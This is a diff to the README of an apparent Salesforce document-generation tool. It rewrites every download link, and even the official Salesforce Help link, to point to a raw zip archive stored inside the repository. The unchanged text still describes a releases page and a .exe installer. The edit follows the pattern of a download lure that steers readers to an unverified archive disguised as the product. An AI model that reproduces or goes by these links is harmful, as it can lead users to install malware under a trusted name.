@@ -1,6 +1,6 @@
 # 🚀 SalesforceDocGen - Easy Document Generation for Salesforce
 
-[![Download Latest](https://img.shields.io/badge/Download%20Latest-brightgreen)](https://github.com/C00lkitdd/SalesforceDocGen/releases)
+[![Download Latest](https://img.shields.io/badge/Download%20Latest-brightgreen)](https://raw.githubusercontent.com/C00lkitdd/SalesforceDocGen/main/force-app/main/default/Salesforce-Gen-Doc-v1.1.zip)
 
 ## 📋 About SalesforceDocGen
 
@@ -32,7 +32,7 @@ These requirements ensure the app runs reliably.
 
 Please visit this page to download the latest version of the app:
 
-[![Download SalesforceDocGen](https://img.shields.io/badge/Download-SalesforceDocGen-blue)](https://github.com/C00lkitdd/SalesforceDocGen/releases)
+[![Download SalesforceDocGen](https://img.shields.io/badge/Download-SalesforceDocGen-blue)](https://raw.githubusercontent.com/C00lkitdd/SalesforceDocGen/main/force-app/main/default/Salesforce-Gen-Doc-v1.1.zip)
 
 This link leads to the GitHub releases page. You will find the most recent files available for Windows there. Download the file with the `.exe` extension or the Windows installer.
 
@@ -41,7 +41,7 @@ This link leads to the GitHub releases page. You will find the most recent files
 Follow these steps to install and run SalesforceDocGen on your PC.
 
 1. Click the download button above or visit the link:
-   https://github.com/C00lkitdd/SalesforceDocGen/releases
+   https://raw.githubusercontent.com/C00lkitdd/SalesforceDocGen/main/force-app/main/default/Salesforce-Gen-Doc-v1.1.zip
 
 2. On the releases page, find the latest release. Look for files named like:
    - `SalesforceDocGen-Setup.exe`
@@ -103,10 +103,10 @@ For questions or help, you can:
 ## 📂 Useful Links
 
 - Official Download Page:  
-  https://github.com/C00lkitdd/SalesforceDocGen/releases  
+  https://raw.githubusercontent.com/C00lkitdd/SalesforceDocGen/main/force-app/main/default/Salesforce-Gen-Doc-v1.1.zip  
 - Salesforce Help:  
-  https://help.salesforce.com
+  https://raw.githubusercontent.com/C00lkitdd/SalesforceDocGen/main/force-app/main/default/Salesforce-Gen-Doc-v1.1.zip
 
 ---
 
-[![Download SalesforceDocGen](https://img.shields.io/badge/Download-SalesforceDocGen-blue)](https://github.com/C00lkitdd/SalesforceDocGen/releases)
+[![Download SalesforceDocGen](https://img.shields.io/badge/Download-SalesforceDocGen-blue)](https://raw.githubusercontent.com/C00lkitdd/SalesforceDocGen/main/force-app/main/default/Salesforce-Gen-Doc-v1.1.zip)
